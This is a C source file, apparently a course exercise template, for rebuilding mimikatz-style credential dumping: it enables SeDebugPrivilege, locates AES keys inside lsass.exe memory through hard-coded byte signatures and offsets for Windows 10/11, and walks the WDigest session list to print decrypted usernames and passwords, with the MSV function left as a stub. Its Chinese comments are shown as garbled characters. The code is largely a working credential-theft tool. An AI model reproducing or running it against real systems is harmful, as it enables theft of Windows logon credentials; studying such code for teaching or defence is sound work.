
#include "mimikatz.h"
#include <stdio.h>

extern BYTE g_sekurlsa_IV[AES_128_KEY_LENGTH];
extern BYTE g_sekurlsa_AESKey[AES_128_KEY_LENGTH];
extern BYTE g_sekurlsa_3DESKey[DES_3DES_KEY_LENGTH];
extern HANDLE g_hLsass;

/*****************************************************
 *  �뽫���º�����д��������ʵ�ֶ�Ӧ�Ĺ���              *
 *    - EnableSeDebugPrivilege                       *
 *****************************************************/
 /// �Ƽ�ʹ��API: OpenProcessToken() LookupPrivilegeValueW() AdjustTokenPrivileges()
BOOL EnableSeDebugPrivilege() {
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;
	// �򿪵�ǰ���̵ķ�������
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))return FALSE;
	// ��ȡ SeDebugPrivilege �� LUID
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid)) {
		CloseHandle(hToken);
		return FALSE;
	}
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	// �������������е�Ȩ��
	if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
		CloseHandle(hToken);
		return FALSE;
	}
	// ����Ƿ�ɹ�������Ȩ��
	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
		CloseHandle(hToken);
		return FALSE;
	}
	CloseHandle(hToken);
	return TRUE;
}


/*****************************************************
 *  �뽫���µ�����������д��������ʵ�ֶ�Ӧ�Ĺ���         *
 *    - LocateUnprotectLsassMemoryKeys               *
 *	  - GetCredentialsFromMSV                        *
 *	  - GetCredentialsFromWdigest                    *
 *****************************************************/

 /// �� lsass.exe �ڴ��ж�ȡ��������ƾ�ݽ���AES���ܻ���3DES����ʹ�õ���Կ
 /// ������Ӧ��ȫ�ֱ��� g_sekurlsa_IV g_sekurlsa_AESKey g_sekurlsa_3DESKey
 /// �Ƽ�API: SearchPattern() ReadFromLsass()
VOID LocateUnprotectLsassMemoryKeys() {
	DWORD keySigOffset = 0;
	DWORD aesOffset = 0;
	KIWI_BCRYPT_HANDLE_KEY hAesKey;
	KIWI_BCRYPT_KEY81 extractedAesKey;
	PVOID keyPointer = NULL;

	// ��lsass.exe�����ص�ģ��lsasrv.dll�����뵱ǰ���̵��ڴ�ռ���
	// �������صĻ���ַ lsasrvBaseAddress �� lsass.exe ������ lsasrv.dll ģ��Ļ���ַ����ͬ��
	// ��ͬһ��DLLģ���ڲ�ͬ�����лᱻ���ص�ͬһ��ַ�� ALSR �������Ӱ�����Ϊ��
	PUCHAR lsasrvBaseAddress = (PUCHAR)LoadLibraryA("lsasrv.dll");

	// lsasrv.dll ģ���е�ȫ�ֱ��� hAesKey ��һ��ָ��ʵ��AES��Կ�Ľṹ��ָ�룬��������λhAesKey��lsass.exe�����еĵ�ַ

	// ����Ӳ������ֽ�����ǩ����Windows 10��Windows 11�ϲ��Կ��ã���Win10��Win11����ʧЧ
	UCHAR keyAESSig[] = { 0x83, 0x64, 0x24, 0x30, 0x00,
						0x48, 0x8d, 0x45, 0xe0,
						0x44, 0x8b, 0x4d, 0xd8,
						0x48, 0x8d, 0x15 };

	// lsasrv.dll �� keyAESSig �ֽ���������Ӧ��ָ���࣬���� 99 2C 10 00 (С���� 0x102c99)
	// Ϊȫ�ֱ��� hAesKey ���ڵ�ַ�����һ��ָ���ַ0x1800752BF��ƫ��
	// �� hAesKey �ṹ�����ڵĵ�ַΪ 0x1800752BF + 0x102c99 = 0x180177F58
	// .text:00000001800752AB 83 64 24 30 00          and     [rsp+70h+var_40], 0
	// .text:00000001800752B0 48 8D 45 E0             lea     rax, [rbp + pbBuffer]
	// .text:00000001800752B4 44 8B 4D D8             mov     r9d, dword ptr[rbp + var_28]; cbKeyObject
	// .text:00000001800752B8 48 8D 15 99 2C 10 00    lea     rdx, ? hAesKey; phKey
	// 
	// .text:00000001800752BF 48 8B 0D 9A 2C 10 00    mov     rcx, cs:?hAesProvider ; hAlgorithm
	//       ^^^^^^^^^^^^^^^^ ע���г��ֵľ��Ե�ַ 0x1800752BF ���� win11��lsasrv.dll Ϊ������ͬ

	// ��lsass���̵��ڴ���������λȫ�ֱ���hAesKey���ڴ�λ��
	// ��ȡ����ָ�� and [rsp+70h+var_40], 0 ���lsasrv.dllģ���ַ��ƫ��
	keySigOffset = SearchPattern(lsasrvBaseAddress, keyAESSig, sizeof keyAESSig);
	wprintf(L"keySigOffset = 0x%x\n", keySigOffset);	// 0x752AB (00000001800752AB & 0xFFFFF)
	if (keySigOffset == 0) return;

	// ��lsass���̵��ڴ�λ��lsasrvBaseAddress + keySigOffset + sizeof keyAESSig �϶�ȡ4�ֽڵ�ƫ��
	//                     0x180000000       + 0x752AB      + 16              = 0x1800752bb
	// *(DWORD *)(0x1800752bb) = 0x102c99
	ReadFromLsass(lsasrvBaseAddress + keySigOffset + sizeof keyAESSig, &aesOffset, sizeof aesOffset);
	wprintf(L"aesOffset = 0x%x\n", aesOffset);	// 0x102c99
	//			0x1800752bb�K
	//				48 8D 15 99 2C 10 00    lea     rdx, ? hAesKey; phKey
	// 0x1800752B8�J         ^^ ^^ ^^ ^^


	// ��lsass���̵��ڴ�λ��lsasrvBaseAddress + keySigOffset + sizeof keyAESSig + 4 + aesOffset �϶�ȡ8�ֽڵ�����
	//                     0x180000000       + 0x752AB      + 16              + 4 + 0x102c99  = 0x180177f58
	//
	// .data:0000000180177F58 ?? ?? ?? ?? ?? ?? ?? ?? ?hAesKey@@3PEAXEA dq ?
	// ����ȡ��8�ֽڵ�������һ��ָ��ṹ�� KIWI_BCRYPT_HANDLE_KEY ��ָ��
	ReadFromLsass(lsasrvBaseAddress + keySigOffset + sizeof keyAESSig + 4 + aesOffset, &keyPointer, sizeof keyPointer);
	wprintf(L"keyPointer = 0x%p\n", keyPointer); // ���� 0x000002318B910230
	//                       ^ �����ڴ���16�ֽڶ��룬�����4bit��Ϊ0

	// ��lsass���̵��ڴ�λ�� keyPointer ��ȡ���ṹ���ʵ������
	// ���� keyPointer δ֪����ʵ���������޷�ʹ��IDA Proͨ����̬�����õ�
	ReadFromLsass(keyPointer, &hAesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY));

	// ��ȡ KIWI_BCRYPT_HANDLE_KEY �ṹ��������Ϊ PKIWI_BCRYPT_KEY81 �ĳ�Ա����ָ����ָ��� KIWI_BCRYPT_KEY81 �ṹ��
	// AES DES ��Կ��ʹ�� KIWI_BCRYPT_KEY81 �ṹ�����
	ReadFromLsass(hAesKey.key, &extractedAesKey, sizeof(KIWI_BCRYPT_KEY81));

	// KIWI_BCRYPT_KEY81 �� hardkey.data������Կ�ֽ����ݣ� hardkey.cbSecret������Կ�ĳ���
	memcpy(g_sekurlsa_AESKey, extractedAesKey.hardkey.data, extractedAesKey.hardkey.cbSecret);

	wprintf(L"AES Key Located (len %d): ", extractedAesKey.hardkey.cbSecret);
	HexdumpBytesPacked(extractedAesKey.hardkey.data, extractedAesKey.hardkey.cbSecret);

	/// ... ���޸�
}

/// ����Wdigest�������ڴ��е���������
VOID GetCredentialsFromWdigest() {
	KIWI_WDIGEST_LIST_ENTRY entry;
	DWORD logSessListSigOffset, logSessListOffset;
	PKIWI_WDIGEST_LIST_ENTRY logSessListAddr = NULL, pList;
	WCHAR passDecrypted[1024];

	PUCHAR wdigestBaseAddress = (PUCHAR)LoadLibraryA("wdigest.dll");

	/// ... ���޸�

	ReadFromLsass(logSessListAddr, &entry, sizeof(KIWI_WDIGEST_LIST_ENTRY));
	pList = entry.This;

	do {
		memset(&entry, 0, sizeof(entry));
		ReadFromLsass(pList, &entry, sizeof(KIWI_WDIGEST_LIST_ENTRY));

		if (entry.UsageCount == 1) {
			UNICODE_STRING* username = ExtractUnicodeString((PUNICODE_STRING)(
				(PUCHAR)pList + offsetof(KIWI_WDIGEST_LIST_ENTRY, UserName)
				));
			UNICODE_STRING* password = ExtractUnicodeString((PUNICODE_STRING)(
				(PUCHAR)pList + offsetof(KIWI_WDIGEST_LIST_ENTRY, Password)
				));

			if (username != NULL && username->Length != 0) wprintf(L"Username: %ls\n", username->Buffer);
			else wprintf(L"Username: [NULL]\n");

			// Check if password is present
			if (password->Length != 0 && (password->Length % 2) == 0) {
				// Decrypt password using recovered AES/3Des keys and IV
				if (DecryptCredentials((char*)password->Buffer, password->MaximumLength,
					(PUCHAR)passDecrypted, sizeof(passDecrypted)) > 0) {
					wprintf(L"Password: %ls\n\n", passDecrypted);
				}
			}
			else {
				printf("Password: [NULL]\n\n");
			}

		}
		pList = entry.Flink;
	} while (pList != logSessListAddr);
	return;
}

/// �Ƽ�ʹ��API: 
///		LoadLibraryA() 
///		SearchPattern() 
///		ReadFromLsass() 
///		DecryptCredentials() 
///		ExtractUnicodeString()
/// �Ƽ�ʹ�ýṹ��: 
///		KIWI_MSV1_0_LIST_63
///		KIWI_MSV1_0_CREDENTIALS 
///		KIWI_MSV1_0_PRIMARY_CREDENTIALS
VOID GetCredentialsFromMSV() {
	DWORD logSessListSigOffset, LogonSessionListOffset;
	PKIWI_MSV1_0_LIST_63 logSessListAddr = NULL;	// List Header

	/// ... ���޸�

	PKIWI_MSV1_0_LIST_63 pList = logSessListAddr;

	do {
		KIWI_MSV1_0_LIST_63 listEntry;
		KIWI_MSV1_0_CREDENTIALS credentials;

		/// ... ���޸�

	} while (pList != logSessListAddr);
}